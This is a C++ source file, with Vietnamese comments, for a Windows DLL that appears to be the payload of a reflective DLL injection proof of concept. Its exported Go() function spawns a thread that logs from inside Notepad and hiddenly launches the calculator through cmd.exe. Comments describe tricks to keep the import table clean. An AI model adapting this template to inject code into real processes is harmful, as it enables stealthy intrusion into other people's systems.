#include "pch.h"
#include <windows.h>

// Hàm ghi log sử dụng Win32 API thuần, không dùng fstream, giữ IAT phẳng sạch kịch trần
void WriteNativeLog(const char* text) {
    // Mở trực tiếp file log bằng API của Kernel
    HANDLE hFile = CreateFileA("C:\\Users\\Admin\\source\\repos\\Reflective_DLL_Injection\\x64\\Release\\diagnostic_log.txt",
        FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        // Ghi chuỗi văn bản vào file
        WriteFile(hFile, text, (DWORD)strlen(text), &bytesWritten, NULL);
        WriteFile(hFile, "\n", 1, &bytesWritten, NULL); // Xuống dòng
        CloseHandle(hFile);
    }
}

// Luồng phụ độc lập hoàn toàn phá băng hàng rào Loader Lock
DWORD WINAPI LaunchPayloadNative(LPVOID lpParam) {
    WriteNativeLog("[+] Luong LaunchPayload da thuc thi inside Notepad!");

    // Khai hỏa Máy tính đa nền tảng linh hoạt đã kiểm chứng của Vinh
    WinExec("cmd.exe /c start calc", SW_HIDE);

    return 0;
}

// Hàm xuất khẩu chiến lược của tác giả Offensive-Panda
extern "C" __declspec(dllexport) int Go(void) {
    WriteNativeLog("[+] Ham Go() duoc goi va thuc thi thanh cong tu xa!");

    // Tạo luồng phụ độc lập an toàn bằng Win32 API thuần
    HANDLE hThread = CreateThread(NULL, 0, LaunchPayloadNative, NULL, 0, NULL);
    if (hThread) {
        WriteNativeLog("[+] CreateThread noi bo trong Notepad hoan tat.");
        CloseHandle(hThread);
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // Luồng từ xa đâm trực tiếp vào hàm Go(), nhánh này giữ trạng thái an toàn
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}